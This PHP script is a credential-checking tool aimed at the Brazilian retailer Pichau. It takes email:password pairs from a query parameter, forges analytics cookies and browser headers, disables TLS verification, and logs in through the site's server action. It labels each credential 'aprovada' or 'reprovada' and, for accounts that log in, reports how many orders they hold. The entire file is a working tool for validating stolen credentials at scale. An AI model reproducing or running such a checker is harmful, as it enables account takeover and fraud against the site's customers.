<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

class PichauAPI {
    private $base_url = 'https://www.pichau.com.br';
    private $cookies = array();
    
    public function __construct() {
        $this->initializeCookies();
        $this->fetchInitialData();
    }
    
    private function initializeCookies() {
        $time = time();
        $this->cookies = array(
            'cf_chl_rc_ni' => '1',
            '_ga' => 'GA1.1.' . mt_rand(1000000000, 9999999999) . '.' . $time,
            '_fbp' => 'fb.2.' . $time . '.' . mt_rand(10000000000000000, 99999999999999999),
            '_gcl_au' => '1.1.' . mt_rand(1000000000, 9999999999) . '.' . $time
        );
    }
    
    private function fetchInitialData() {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $this->base_url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (X11; CrOS x86_64 14816.131.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36');
        
        $cookie_string = '';
        foreach ($this->cookies as $key => $value) {
            $cookie_string .= $key . '=' . $value . '; ';
        }
        curl_setopt($ch, CURLOPT_COOKIE, $cookie_string);
        
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language: pt-BR,pt;q=0.9',
            'Sec-Ch-Ua: ".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
            'Sec-Ch-Ua-Mobile: ?0',
            'Sec-Ch-Ua-Platform: "Chrome OS"'
        ));
        
        $response = curl_exec($ch);
        curl_close($ch);
        return true;
    }
    
    private function generateRandomString($length = 32) {
        $chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_';
        $result = '';
        for ($i = 0; $i < $length; $i++) {
            $result .= $chars[mt_rand(0, strlen($chars) - 1)];
        }
        return $result;
    }
    
    private function generateToken() {
        $token_parts = array(
            $this->generateRandomString(8),
            $this->generateRandomString(8),
            $this->generateRandomString(8),
            $this->generateRandomString(8),
            $this->generateRandomString(12)
        );
        return implode('-', $token_parts);
    }
    
    public function loginAndGetOrders($email, $password) {
        if (empty($email) || empty($password)) {
            return array(
                'status' => 'reprovada',
                'credential' => $email . '|' . $password,
                'message' => 'email ou senha incorretos'
            );
        }
        
        $security_token = $this->generateToken();
        $login_data = array($email, $password, $security_token);
        $json_data = json_encode($login_data);
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $this->base_url . '/account');
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $json_data);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (X11; CrOS x86_64 14816.131.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36');
        
        $cookie_string = '';
        foreach ($this->cookies as $key => $value) {
            $cookie_string .= $key . '=' . $value . '; ';
        }
        curl_setopt($ch, CURLOPT_COOKIE, $cookie_string);
        
        $headers = array(
            'Accept: text/x-component',
            'Accept-Language: pt-BR,pt;q=0.9',
            'Content-Type: text/plain;charset=UTF-8',
            'Next-Action: 7f6514ebfa32028c47c0d04899b4fcf264b345596e',
            'Next-Router-State-Tree: %5B%22%22%2C%7B%22children%22%3A%5B%22account%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%2Ctrue%5D',
            'Origin: ' . $this->base_url,
            'Referer: ' . $this->base_url . '/account',
            'Sec-Ch-Ua: ".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
            'Sec-Ch-Ua-Arch: "x86"',
            'Sec-Ch-Ua-Bitness: "64"',
            'Sec-Ch-Ua-Mobile: ?0',
            'Sec-Ch-Ua-Platform: "Chrome OS"'
        );
        
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        
        $response = curl_exec($ch);
        $header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
        $headers_response = substr($response, 0, $header_size);
        $body = substr($response, $header_size);
        
        curl_close($ch);
        
        $is_logged = false;
        
        preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $headers_response, $cookie_matches);
        $new_cookies = isset($cookie_matches[1]) ? $cookie_matches[1] : array();
        
        foreach ($new_cookies as $cookie) {
            if (strpos($cookie, 'pichau_customer_token_v1') !== false) {
                $is_logged = true;
                $parts = explode('=', $cookie, 2);
                if (count($parts) == 2) {
                    $this->cookies[$parts[0]] = $parts[1];
                }
                break;
            }
        }
        
        if (strpos($body, 'isAuth":true') !== false) {
            $is_logged = true;
        }
        
        if (!$is_logged) {
            return array(
                'status' => 'reprovada',
                'credential' => $email . '|' . $password,
                'message' => 'email ou senha incorretos'
            );
        }
        
        $orders_count = $this->fetchOrdersCount();
        
        return array(
            'status' => 'aprovada',
            'credential' => $email . '|' . $password,
            'message' => $orders_count . ' pedidos'
        );
    }
    
    private function fetchOrdersCount() {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $this->base_url . '/account/orders');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (X11; CrOS x86_64 14816.131.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36');
        
        $cookie_string = '';
        foreach ($this->cookies as $key => $value) {
            $cookie_string .= $key . '=' . $value . '; ';
        }
        curl_setopt($ch, CURLOPT_COOKIE, $cookie_string);
        
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language: pt-BR,pt;q=0.9',
            'Referer: ' . $this->base_url . '/account'
        ));
        
        $response = curl_exec($ch);
        $header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
        $headers = substr($response, 0, $header_size);
        $body = substr($response, $header_size);
        
        curl_close($ch);
        
        preg_match('/next-action:\s*([a-f0-9]+)/i', $headers, $matches);
        $next_action = isset($matches[1]) ? $matches[1] : '7fd0b662f677df4d9ca82fc18f7c172a8bc916b107';
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $this->base_url . '/account/orders');
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, '[100,1]');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (X11; CrOS x86_64 14816.131.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36');
        
        $cookie_string = '';
        foreach ($this->cookies as $key => $value) {
            $cookie_string .= $key . '=' . $value . '; ';
        }
        curl_setopt($ch, CURLOPT_COOKIE, $cookie_string);
        
        $headers = array(
            'Accept: text/x-component',
            'Accept-Language: pt-BR,pt;q=0.9',
            'Content-Type: text/plain;charset=UTF-8',
            'Next-Action: ' . $next_action,
            'Next-Router-State-Tree: %5B%22%22%2C%7B%22children%22%3A%5B%22account%22%2C%7B%22children%22%3A%5B%22orders%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%2Ctrue%5D',
            'Origin: ' . $this->base_url,
            'Referer: ' . $this->base_url . '/account/orders',
            'Sec-Ch-Ua: ".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
            'Sec-Ch-Ua-Arch: "x86"',
            'Sec-Ch-Ua-Bitness: "64"',
            'Sec-Ch-Ua-Mobile: ?0',
            'Sec-Ch-Ua-Platform: "Chrome OS"'
        );
        
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        
        $response = curl_exec($ch);
        curl_close($ch);
        
        $orders_count = 0;
        
        if (preg_match('/"totalCount":(\d+)/', $response, $matches)) {
            $orders_count = intval($matches[1]);
        }
        
        if ($orders_count == 0 && preg_match('/"total":(\d+)/', $response, $matches)) {
            $orders_count = intval($matches[1]);
        }
        
        if ($orders_count == 0 && preg_match_all('/"number":"\d+"/', $response, $matches)) {
            $orders_count = count($matches[0]);
        }
        
        if ($orders_count == 0 && preg_match_all('/"order_number"/', $response, $matches)) {
            $orders_count = count($matches[0]);
        }
        
        if ($orders_count == 0 && preg_match_all('/"id":"[^"]+"/', $response, $matches)) {
            $ids = array();
            foreach ($matches[0] as $match) {
                if (preg_match('/\d{7,}/', $match, $num_match)) {
                    $ids[] = $num_match[0];
                }
            }
            $orders_count = count(array_unique($ids));
        }
        
        if ($orders_count == 0 && preg_match_all('/pedido\s*[nN][oO]\.?\s*(\d+)/i', $response, $matches)) {
            $orders_count = count(array_unique($matches[1]));
        }
        
        return $orders_count;
    }
}

if (isset($_GET['lista'])) {
    header('Content-Type: text/plain; charset=UTF-8');
    header('Access-Control-Allow-Origin: *');
    
    $credentials = explode(':', $_GET['lista']);
    
    if (count($credentials) < 2) {
        echo 'reprovada ' . $_GET['lista'] . '-> formato inválido';
        exit;
    }
    
    $email = trim($credentials[0]);
    $password = trim($credentials[1]);
    
    $api = new PichauAPI();
    $result = $api->loginAndGetOrders($email, $password);
    
    echo $result['status'] . ' ' . $result['credential'] . '-> ' . $result['message'];
    
} else {
    header('Content-Type: text/plain; charset=UTF-8');
    echo 'reprovada ?|?-> formato inválido - Use: ?lista=email|senha';
}
?>